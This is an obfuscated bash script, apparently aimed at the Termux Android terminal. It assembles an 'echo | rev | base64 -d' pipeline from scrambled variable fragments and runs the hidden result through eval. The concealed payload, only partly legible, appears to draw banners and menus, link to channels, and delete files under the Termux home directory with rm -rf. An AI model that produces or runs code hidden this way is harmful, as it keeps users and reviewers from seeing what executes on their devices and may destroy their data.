gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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ACIgACIgACIgACIgACIiASZtAyboNWZKogCKIiIg8GajVmCiMSP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90zIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgAyRkACXfxFIgAyLf9yXcBCffx1XcBCIg8yXvACffx3Lf91Xfx3Xf91XfxHIgACIDRyIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgcEJgACXg81XfByL8BCIcxHI8xFIf91Xg8yXfBCI8BSKf91Xg81XfxHI8BCIgAyQkMCIgACIgACIgACIHRiIgUWLg8GajVmCiMCIgACIHRCIgACXg8FIvACfgwHXgACfgwFIfByLgkyX8BCfcByXf9FXgw3XgACfgACIgMEJjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgAyRkACIgACXg8CIgwHI8BCXgwHIgwFIvACXg8FIgwHff91Xg8yXf91XgwHIgACIDRyIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgcEJgACIgAyXgACIg8FIgAyXgACIg8FIgAyXf91XgAyXf91Xg81Xf91XgACIgAyQkMCIgACIgACIgACIHRiIgUWLg8GajVmCiMCIgACIgACIgACIgACIgcEJgAyLf91XcByLf91Xfx3X8BCffxHIgACIgACIgACIgACIgkFJjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgACIgACIgACIgACIHRCI8BCffxHI8BSKfxHI8BCIfBCI8BCIgACIgACIgACIgACIZRyIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgACIgACIgACIgAyRkACfgwHI8BCfcByXgACfgw3X8BCfgACIgACIgACIgACIgASWkMCIgACIgACIgACIHRiIgUWLg8GajVmCiMCIgACIgACIgACIgACIgcEJgACXg8FIvASKg81XgwHI8BCfgwHIgACIgACIgACIgACIgkFJjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgACIgACIgACIgACIHRCIgAyXf9FIgAyXf91Xg8FIgAyXgACIgACIgACIgACIgACIZRyIgACIgACIgACIgcEJiASZtAyboNWZKIyI90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TPjACIgACIgACIgAyRkICIl1CIvh2YlpgCKIXYlx2YKQWYlJnCiEGduVWdjBSYuVHIyFmcl5WZnBSYyFGcgIXZ05WZgUmbvl2clJHcgcEJiASZtAyboNWZKIiIg8GajVmCi4iLu4iLu4SQU5URVNEIVNFISVkTFRFIOFERFVFUgM1TSR1TgUUVRBSQSFEUgMVQNByUFJVROV0Rg8kTgEUWg4EJiASZtAyboNWZKISQOVFITVEVTFkUF5URHBSQZBSSTBSWgUEVOVUST50TDByUBV0UgUUVRBiUPZVQGBSREByTElEUgUEVg80UFBiUPBFIORiIgUWLg8GajVmCiAiUB50TJNkTVZEIFREIBJVQKVERgEUTBJ1RPJFUgUEVTVEITFUkDX0UBJFVO90QgMVQMBiUBlkQNF0QgEEIOF0RFxETgU0Ugk0Ug4EJiASZtAyboNWZKICoS+J8gEUSD5URUJVRWRUQgAqkfCPIgACIgACIgACIgACIgACIgACIgACIgACIgAiUkICIl1CIvh2YlpgIiAyboNWZKISXhsFIBF5wBB1UFByTChEIzFGduVWdjBSZkBicvRWYyVmbldGIdFyWgkFJiASZtAyboNWZKIiIg8GajVmCiEkdyQTRzcXauhmQ4dTeiNlRxJzbZNzQV9Cbl5mbhh2Yv02bj5SZiVHd19Weuc3d39yL6MHc0RHagIEJ+4DIHRyTWVUVOBiQk0lKbBiTkICIl1CIvh2YlpgIBlEOtF3NBdzUsp0Y11CMsRXY1I2N3NUVvwWZu5WYoN2Lt92YuUmY1RXdvlnL3d3dv8iOzBHd0hGICRiP+AyRkwUQOF0QgkUTgIEJdpyWg4EJiASZtAyboNWZKIyYhJ3asVmbvNWYlt2Yhh0Ll1mL09yL6MHc0RHagIEJ+4DIHRSTBJ1RFxURUBSSNBiQk0lKbBiTkICIl1CIvh2YlpgIiAyboNWZKICelACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIisCIlRXYkpgI8wDIjFmcrBCblBicvBHIvRWYlJ3YgUWdmBCdwlmcjNHIlR3clBiP+cEJgACIgACIgACIgACIgACIgICIl1CIvh2YlpgCKogCKIiIg8GajVmCiMSP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90zIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgAyRkACXfxFIgAyLf9yXcBCffx1XcBCIg8yXvACffx3Lf91Xfx3Xf91XfxHIgACIDRyIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgcEJgACXg81XfByL8BCIcxHI8xFIf91Xg8yXfBCI8BSKf91Xg81XfxHI8BCIgAyQkMCIgACIgACIgACIHRiIgUWLg8GajVmCiMCIgACIHRCIgACXg8FIvACfgwHXgACfgwFIfByLgkyX8BCfcByXf9FXgw3XgACfgACIgMEJjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgAyRkACIgACXg8CIgwHI8BCXgwHIgwFIvACXg8FIgwHff91Xg8yXf91XgwHIgACIDRyIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgcEJgACIgAyXgACIg8FIgAyXgACIg8FIgAyXf91XgAyXf91Xg81Xf91XgACIgAyQkMCIgACIgACIgACIHRiIgUWLg8GajVmCiMCIgACIgACIgACIgACIgcEJgAyLf91XcByLf91Xfx3X8BCffxHIgACIgACIgACIgACIgkFJjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgACIgACIgACIgACIHRCI8BCffxHI8BSKfxHI8BCIfBCI8BCIgACIgACIgACIgACIZRyIgACIgACIgACIgcEJiASZtAyboNWZKIyIgACIgACIgACIgACIgAyRkACfgwHI8BCfcByXgACfgw3X8BCfgACIgACIgACIgACIgASWkMCIgACIgACIgACIHRiIgUWLg8GajVmCiMCIgACIgACIgACIgACIgcEJgACXg8FIvASKg81XgwHI8BCfgwHIgACIgACIgACIgACIgkFJjACIgACIgACIgAyRkICIl1CIvh2YlpgIjACIgACIgACIgACIgACIHRCIgAyXf9FIgAyXf91Xg8FIgAyXgACIgACIgACIgACIgACIZRyIgACIgACIgACIgcEJiASZtAyboNWZKIyI90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TP90TPjACIgACIgACIgAyRkICIl1CIvh2YlpgCn0GMbNzMww1J9clCn0mNzsTMbNzMww1J9MkCn0WNzsTMbNzMww1J90kCn0GNzsTMbNzMww1J9IkCn02MzsTMbNzMww1J9klCn0mMzsTMbNzMww1J9ckCn0WMzsTMbNzMww1J9IlCn0GMzsTMbNzMww1J94kCyFWZsNmCoNXYi9ibpJ2LyNXdvMXZslmZvgXdtJXZ05SbvN2LhRXYk9SY0FGZvEyI
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
